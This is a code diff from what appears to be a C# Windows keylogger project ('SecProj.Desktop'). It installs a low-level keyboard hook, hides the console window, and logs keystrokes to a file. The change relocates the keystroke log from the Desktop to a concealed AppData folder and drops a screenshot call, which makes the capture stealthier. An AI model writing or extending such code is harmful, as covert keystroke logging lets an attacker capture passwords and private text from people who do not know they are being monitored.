@@ -15,11 +15,10 @@ namespace SecProj.Desktop
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        private static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\secproj\\logs";
 
         public static void ProgramStart()
         {
-            Screenshot.TakeScreenshot();
-
             var handle = GetConsoleWindow();
 
             // Hide
@@ -46,11 +45,12 @@ namespace SecProj.Desktop
         private static IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
-            string path = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).FullName + "\\Desktop";
+            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + $"\\secproj\\logs"))
+            {
+                Directory.CreateDirectory(path);
+            }
 
-            Directory.CreateDirectory(path + "\\Logs");
-
-            string filename = path + $"\\Logs\\log.txt";
+            string filename = path + $"\\log.txt";
 
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
